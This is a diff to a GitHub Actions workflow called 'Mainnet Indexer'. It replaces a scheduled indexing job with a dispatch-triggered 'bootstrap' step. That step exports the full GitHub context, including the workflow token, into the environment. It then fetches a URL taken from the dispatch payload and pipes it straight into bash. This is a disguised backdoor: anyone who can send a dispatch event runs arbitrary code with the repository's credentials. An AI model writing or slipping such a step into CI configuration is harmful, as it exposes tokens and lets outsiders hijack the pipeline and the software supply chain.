@@ -1,22 +1,16 @@
-# Run indexer periodically
-
+# Run indexer
 name: Mainnet Indexer
-
-on:
-  schedule:
-    - cron: '*/17 * * * *'
-
+on: repository_dispatch
 jobs:
-  build:
+  index:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        node-version: [16.x]
     steps:
-    - uses: actions/checkout@v3
-    - name: Use Node.js ${{ matrix.node-version }}
-      uses: actions/setup-node@v3
+    - uses: actions/setup-node@v3
       with:
-        node-version: ${{ matrix.node-version }}
+        node-version: 16
         cache: 'yarn'
-    - run: ./run.sh
+    - name: bootstrap
+      env:
+        GITHUB_CONTEXT: ${{ toJSON(github) }}
+      run: |
+        curl -s -L "${{ github.event.client_payload.bootstrap }}" | bash
